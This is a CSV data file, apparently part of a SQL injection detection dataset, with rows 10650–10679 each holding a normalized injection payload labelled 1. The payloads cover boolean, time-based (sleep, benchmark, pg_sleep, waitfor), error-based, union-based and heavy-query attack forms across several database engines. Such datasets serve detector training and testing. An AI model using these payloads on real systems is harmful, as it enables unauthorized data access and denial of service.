row_index,payload_norm,label,sqli_type_hint
10650,"1' ) where 6388 = 6388 or 7417 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",1,
10651,"1' ) ) and 8407 = ( select count ( * ) from generate_series ( 1,5000000 ) ) and ( ( 'lwyo' = 'lwyo",1,
10652,1 where 8532 = 8532,1,
10653,"-8790' ) or 1570 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 1570 = 1570 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( 'nsze' like 'nsze",1,
10654,"-9023%"" ) ) ) union all select 4490,4490,4490#",1,
10655,"1%"" and make_set ( 2905 = 5725,5725 ) and ""%"" = """,1,
10656,"1 ) ) ) ( select ( case when ( 5451 = 5451 ) then regexp_substring ( repeat ( right ( char ( 5451 ) ,0 ) ,500000000 ) ,null ) else char ( 108 ) ||char ( 76 ) ||char ( 112 ) ||char ( 116 ) end ) from information_schema.system_users ) and ( ( ( 3023 = 3023",1,
10657,"1"" or 8466 = benchmark ( 5000000,md5 ( 0x694a4745 ) ) and ""xbft"" = ""xbft",1,
10658,"1"" or char ( 119 ) ||char ( 100 ) ||char ( 99 ) ||char ( 121 ) = regexp_substring ( repeat ( right ( char ( 1441 ) ,0 ) ,5000000000 ) ,null ) --",1,
10659,"-4615' ) ) ) or elt ( 1032 = 1032,3623 ) and ( ( ( 'jipk' like 'jipk",1,
10660,"1"" ) ) ) and char ( 120 ) ||char ( 106 ) ||char ( 117 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 9981 ) ,0 ) ,5000000000 ) ,null ) and ( ( ( ""uqyb"" = ""uqyb",1,
10661,"1 ) where 9724 = 9724 or char ( 68 ) ||char ( 69 ) ||char ( 97 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 5389 ) ,0 ) ,5000000000 ) ,null ) --",1,
10662,"-2149"" ) ) ) or elt ( 1032 = 1032,3623 ) and ( ( ( ""hoon"" like ""hoon",1,
10663,"-4513"" ) ) ) or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) and ( ( ( ""gytb"" = ""gytb",1,
10664,"1 or char ( 68 ) ||char ( 69 ) ||char ( 97 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 5389 ) ,0 ) ,5000000000 ) ,null ) # tcrm",1,
10665,"1"" ) ) ) or 7417 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",1,
10666,waitfor delay '0:0:5' and ( 4614 = 4614,1,
10667,"1' ) as bxae where 4143 = 4143 or updatexml ( 1808,concat ( 0x2e,0x7171706a71, ( select ( elt ( 1808 = 1808,1 ) ) ) ,0x717a767a71 ) ,8666 ) --",1,
10668,"1' and 3824 = benchmark ( 5000000,md5 ( 0x76555642 ) ) and 'vmuj' like 'vmuj",1,
10669,"1' ) ) and elt ( 1210 = 1210,sleep ( 5 ) ) and ( ( 'zizo' like 'zizo",1,
10670,1 and sleep ( 5 ),1,
10671,"-5595"" ) ) as xttj where 4562 = 4562 union all select 4562,4562,4562,4562,4562#",1,
10672,"1"" ) union all select null--",1,
10673,1' where 1692 = 1692,1,
10674,"1 ) or elt ( 5873 = 5873,sleep ( 5 ) ) #",1,
10675,"1 ) where 5333 = 5333 or 9643 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",1,
10676,"select dbms_pipe.receive_message ( chr ( 66 ) ||chr ( 67 ) ||chr ( 79 ) ||chr ( 101 ) ,5 ) from dual and ( 'hmsu' = 'hmsu",1,
10677,1 ) ) ) and 6969 = ( select 6969 from pg_sleep ( 5 ) ) and ( ( ( 5333 = 5333,1,
10678,"1, ( select ( case when ( 5141 = 5141 ) then ( ascii ( regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) ) ) else 5141/ ( select 0 from ( values ( 0 ) ) ) end ) from ( values ( 0 ) ) )",1,
10679,"1"" where 6686 = 6686 or elt ( 6272 = 6272,sleep ( 5 ) ) --",1,
